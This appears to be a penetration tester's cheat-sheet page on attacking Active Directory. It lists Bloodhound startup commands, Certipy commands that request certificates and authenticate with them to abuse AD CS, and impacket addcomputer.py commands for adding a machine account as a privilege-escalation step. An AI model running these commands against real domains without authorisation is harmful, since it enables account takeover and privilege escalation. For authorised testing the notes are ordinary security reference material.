---
title: Active Directory (AD) Pentesting
desc: Active Directory is a directory service developed by Microsoft for Windows domain networks.
tags: [Active, AD, Bloodhound, Certipy, Directory Privilege, Windows]
alts: []
render_with_liquid: false
---

## 1. Reveal Relationships

1. **Use Bloodhound**

    [Bloodhound](https://github.com/BloodHoundAD/BloodHound){:target="_blank"} is an analyzing tool of Active Directory.

    ```sh
    # Start neo4j before starting Bloodhound
    neo4j console

    # Start Bloodhound
    bloodhound
    ```

<br />

## 2. Active Directory Certificate Services (AD CS)

1. **Request Certification & Authentication**

    **[Certipy](https://github.com/ly4k/Certipy){:target="_blank"}** is a tool for enumerating and abusing of AD CS.

    ```sh
    # User Template
    certipy req 'vuln.local/username:password@vuln.com' -ca VULN-CA  -template User
    # Machine Template
    certipy req 'vuln.local/machine-name:machine-password@vuln.com' -ca VULN-CA -template Machine

    # After requesting it, use the output credential when authenticating
    certipy auth -pfx user.pfx
    certipy auth -pfx machine.pfx
    ```

2. **Add Your Computer to the Domain**

    Using **addcomputer ([impacket](https://github.com/SecureAuthCorp/impacket){:target="_blank"})**  
    It is usually used for AD CS (Active Directory Certificate Services) Privilege Escalation.

    ```sh
    python3 ./impacket/examples/addcomputer.py '<domain-name>/username:password' -method LDAPS -computer-name 'PC-NAME' -computer-pass 'MyPcPassword'
    # or
    python3 ./impacket/examples/addcomputer.py '<domain-name>/username:password@<hostname>' -method LDAPS -computer-name 'PC-NAME' -computer-pass 'MyPcPassword'
    ```